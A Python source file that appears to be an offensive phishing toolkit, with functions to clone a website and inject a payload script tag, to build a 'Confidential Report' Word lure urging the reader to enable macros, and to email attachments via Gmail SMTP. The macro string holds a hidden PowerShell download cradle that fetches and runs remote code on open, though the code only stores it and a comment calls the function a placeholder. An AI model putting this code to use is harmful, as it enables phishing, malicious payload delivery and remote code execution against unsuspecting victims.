import requests
from bs4 import BeautifulSoup
import logging
import os

def clone_website(url, payload_url):
    """
    Clones a website and injects a script tag to serve a payload.
    """
    logging.info(f"Cloning website: {url}")
    try:
        response = requests.get(url)
        if response.status_code != 200:
            logging.error(f"Failed to clone website. Status code: {response.status_code}")
            return None

        soup = BeautifulSoup(response.text, 'html.parser')

        # Inject the payload script tag into the head
        script_tag = soup.new_tag("script", src=payload_url)
        if soup.head:
            soup.head.insert(0, script_tag)
        else:
            # If no head tag, add one
            head = soup.new_tag("head")
            soup.html.insert(0, head)
            soup.head.append(script_tag)

        # Create a directory to serve the cloned site
        output_dir = "cloned_site"
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        # Save the modified HTML
        cloned_html_path = os.path.join(output_dir, "index.html")
        with open(cloned_html_path, "w", encoding="utf-8") as f:
            f.write(str(soup))

        logging.info(f"Website cloned successfully. Modified HTML saved to {cloned_html_path}")
        return output_dir

    except Exception as e:
        logging.error(f"An error occurred while cloning the website: {e}")
        return None

from docx import Document
from docx.shared import Inches

def create_macro_doc(output_path, payload_command):
    """
    Creates a Word document with a malicious macro that executes a payload.
    """
    logging.info(f"Creating infectious Word document at {output_path}...")

    document = Document()
    document.add_heading('Confidential Report', 0)

    p = document.add_paragraph('This document contains sensitive information. ')
    p.add_run('Please enable macros').bold = True
    p.add_run(' to view the full content.')

    # This is a simplified macro. A real one would be more sophisticated.
    # It uses a simple PowerShell download cradle.
    macro_code = f"""
Sub AutoOpen()
    Dim str As String
    str = "powershell.exe -nop -w hidden -c \\"IEX ((new-object net.webclient).downloadstring('{payload_command}'))\\""
    CreateObject("WScript.Shell").Run str, 0, False
End Sub
"""

    # python-docx does not support creating macros.
    # This function serves as a placeholder for what would be a more
    # complex implementation, likely involving COM automation on Windows.
    document.save(output_path)
    logging.info(f"Word document saved to {output_path}.")
    logging.warning("Macro functionality is not implemented. This is a placeholder.")
    return output_path, None

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def send_email(sender_email, sender_password, recipient_email, subject, body, attachment_path=None):
    """
    Sends an email using an SMTP server.
    """
    logging.info(f"Preparing to send email to {recipient_email}...")

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    if attachment_path:
        try:
            with open(attachment_path, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
            msg.attach(part)
        except Exception as e:
            logging.error(f"Failed to attach file {attachment_path}: {e}")
            return False

    try:
        # This assumes a Gmail SMTP server. The user may need to configure this.
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        text = msg.as_string()
        server.sendmail(sender_email, recipient_email, text)
        server.quit()
        logging.info("Email sent successfully.")
        return True
    except Exception as e:
        logging.error(f"Failed to send email: {e}")
        return False